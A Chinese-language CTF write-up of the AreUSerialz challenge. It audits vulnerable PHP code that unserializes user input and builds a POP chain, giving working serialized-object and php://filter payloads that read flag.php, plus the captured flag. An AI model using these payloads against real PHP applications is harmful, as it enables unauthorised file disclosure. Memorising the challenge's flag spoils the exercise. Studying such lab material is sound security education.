---
title: 网鼎杯2020青龙组-AreUSerialz1
date: 2025-03-13 23:36:35
tags:
- php反序列化
- 文件包含
category:
- 刷题笔记
---

## [网鼎杯 2020 青龙组]AreUSerialz11

1、首先启动靶机并访问，上来就是一堆代码。

```
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

2、代码审计

下面的代码

```
首先看下面的代码，先不管类
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

这里对我们get传参str先转换为字符串，然后进行了验证，只允许传入ascii码值32到125之间的字符（过滤掉的空字符，这对我们后面有影响），如果判断为true就会对我们传入的进行反序列化。

---

类代码

```
class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}
```

最上面的\_\_construct方法可以直接忽略，因为只有在创建对象时初始化对象的属性时才会触发。

所以我们直接看下面的__destruct方法，因为可以在反序列化时触发。

首先会进行一个强类型比较会把我们的op赋值为1，绕过很简单，只要我们反序列化的op为数字2即可绕过，然后就会执行process()方法，然后又能绕过弱类型比较。然后执行read()方法赋值给$res，然后会输出$res的内容。而read()方法会使用file_get_contents函数去读取我们传入的filename，所以我们反序列化的时候将filename赋值为flag.php即可，最后就能通过output函数输出flag了

3、构造pop链

```
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    public $op = 2;
    public $filename = 'flag.php';
    public $content;



}
echo serialize(new FileHandler());
```

**这里我们需要将这三个成员属性的修饰类型改为public，因为php7对成员属性的修饰类型不敏感，由于在原代码中，op等的属性为protected，is_valid($s)判断，这个主要是会使得我们在序列化protected属性的变量时带着的空字符被检测出来。将protected属性改为public属性(公共的 任何成员都可以访问)，即可解决该问题。**

我们能得到这样一串序列化字符串

```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
```

4、构造payload：

所以payload：

```
?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}

得到flag
<?php $flag='flag{228ac245-1573-43af-8075-95ec3af0fb35}';
```

然后查看源代码就能看到flag了。这里还可以使用php伪协议来读取flag.php文件，但是要进行base64解码。

payload：

```
?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
```

flag：

```
得到PD9waHAgJGZsYWc9J2ZsYWd7MjI4YWMyNDUtMTU3My00M2FmLTgwNzUtOTVlYzNhZjBmYjM1fSc7Cg==
解码之后就得到flag了
<?php $flag='flag{228ac245-1573-43af-8075-95ec3af0fb35}';
```

